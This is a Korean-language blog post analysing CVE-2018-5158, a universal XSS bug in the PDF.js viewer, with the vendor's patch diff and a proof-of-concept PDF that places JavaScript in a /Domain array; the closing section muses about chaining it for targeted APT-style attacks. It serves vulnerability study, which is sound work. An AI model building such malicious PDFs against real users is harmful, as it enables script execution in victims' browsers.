---
layout: post
title: "CVE-2018-5158 1-day Analysis"
excerpt: "PDF Viewer UXSS Trigger"
date: 2021-03-21
categories: [Web,CVE]
comments: true
---

<h3> 0x0. CVE-2018-5158</h3>


웹 익스텐션인 PDF뷰어(pdf.worker.js)를 통해서 트리거되는 UXSS 기법의 취약점

PDF뷰어에서 PostScript를 이용할 때, 인풋 파라미터 값을 어레이인지만 검증하고 직접적인 필터링을 하지 않음으로 발생

Safari 13.0.5와 Firefox 74.0 등등에서 작동



<h3> 0x1. 벡터</h3>


PDF Viewer는 PostScript Calculator 기능을 처리할 때,  자바스크립트로 변환하여 작업하는데 이때, PostScript 자체의 코드는 보안하지만 /Domain이나 /Range를 통해서 넘어오는 인풋값은 따로 검증하지 않음. 이를 통해서 PDF에 xss스크립트를 삽입하고 뷰어를 통하여 확인할 때 트리거 가능

```javascript
+      function toNumberArray(arr) {
+        if (!Array.isArray(arr)) {
+          return null;
+        }
+        var length = arr.length;
+        for (var i = 0; i < length; i++) {
+          if (typeof arr[i] !== 'number') {
+            var result = new Array(length);
+            for (var j = 0; j < length; j++) {
+              result[j] = +arr[j];
+            }
+            return result;
+          }
+        }
+        return arr;
+      }
       var PDFFunction = function PDFFunctionClosure() {
         var CONSTRUCT_SAMPLED = 0;
         var CONSTRUCT_INTERPOLATED = 2;
         var CONSTRUCT_STICHED = 3;
         var CONSTRUCT_POSTSCRIPT = 4;
         return {
           getSampleArray: function PDFFunction_getSampleArray(size, outputSize, bps, str) {
             var i, ii;
@@ -41747,43 +41763,43 @@
                 out[index] = [
                   arr[i],
                   arr[i + 1]
                 ];
                 ++index;
               }
               return out;
             }
-            var domain = dict.getArray('Domain');
-            var range = dict.getArray('Range');
+            var domain = toNumberArray(dict.getArray('Domain'));
+            var range = toNumberArray(dict.getArray('Range'));
             if (!domain || !range) {
               error('No domain or range');
             }
             var inputSize = domain.length / 2;
             var outputSize = range.length / 2;
             domain = toMultiArray(domain);
             range = toMultiArray(range);
-            var size = dict.get('Size');
+            var size = toNumberArray(dict.get('Size'));
             var bps = dict.get('BitsPerSample');
             var order = dict.get('Order') || 1;
             if (order !== 1) {
               // No description how cubic spline interpolation works in PDF32000:2008
               // As in poppler, ignoring order, linear interpolation may work as good
               info('No support for cubic spline interpolation: ' + order);
             }
-            var encode = dict.getArray('Encode');
+            var encode = toNumberArray(dict.getArray('Encode'));
             if (!encode) {
               encode = [];
               for (var i = 0; i < inputSize; ++i) {
-                encode.push(0);
-                encode.push(size[i] - 1);
-              }
-            }
-            encode = toMultiArray(encode);
-            var decode = dict.getArray('Decode');
+                encode.push([0, size[i] - 1]);
+              }
+            } else {
+              encode = toMultiArray(encode);
+            }
+            var decode = toNumberArray(dict.getArray('Decode'));
```

이를 근거로 배열에 페이로드를 첨부하여 사용자가 pdf 뷰어를 통해 이를 열람할 때 공격이 가능하다. 이건 diff라서 패치가 된 모습도 보여주는데 이전 - 버전을 보면 값에 대한 검증을 하지 않는 것 을 알 수 있다.



<h3>0x2. PoC</h3>


```javascript
/%PDF-1.4.1 0 obj.<<.  /FunctionType 4.  /Domain [(console.log("test")) 0].  /Range [0 0].  /Length 12.>>.stream.{.  0 add.}.endstream.endobj.2 0 obj.<<.  /Type /Catalog.  /Pages 3 0 R.>>.endobj.3 0 obj.<<.  /Type /Pages.  /Kids [6 0 R].  /Count 1.>>.endobj.4 0 obj.[ /Indexed.  [ /DeviceN.    [/Cyan /Black].    /DeviceCMYK.    1 0 R.  ].  1(123).].endobj.5 0 obj.<<.  /Type /XObject.  /Subtype /Image.  /Width 1.  /Height 1.  /ColorSpace 4 0 R.  /BitsPerComponent 8.  /Length 1.>>.stream.x.endstream.endobj.6 0 obj.<<.  /Type /Page.  /Parent 3 0 R.  /Resources.  <<.    /XObject << /Im5 5 0 R >>.  >>.  /MediaBox [0 0 100 100].  /Contents 7 0 R.>>.endobj.7 0 obj.<<.  /Length 100.>>.stream.  1  1  1  rg.  0  0  100 100 re  f.  BT.    /Para << /MCID 1 >>.    BDC.      /Im5 Do.    EMC.  ET.endstream.endobj.trailer.<<.  /Root 2 0 R.>>.startxref.%%EOF.
```

 이게 PoC.pdf의 hex내용이고 사실상 그냥 /Domain에 [(console.log("test")) 0]이다. 그 후에 조건 값을 맞춰주면서 트리거를 진행하면 된다.



<h3>0x3.ETC</h3>


추가적으로 PDF Viewer 는 CORS를 우회할 수 있는 방법이 많기 때문에 이를 더 연구해보면 좋을 것 같다. 또한 공격의 특성상 상대방이 해당 PDF파일을 열람을 해야만 공격이 가능해서 이를 연계하는 방법에 대해서도 구상이 필요하다.

이를 통해서 특정 타겟에 대한 xss 공격을 시행할 수 있어서 apt공격 같은 경우에도 사용이 될 것 같다. uxss사례들을 다양하게 공부해보면 좋을 것 같다.



<h3>0x4. Reference</h3>


https://nvd.nist.gov/vuln/detail/CVE-2018-5158
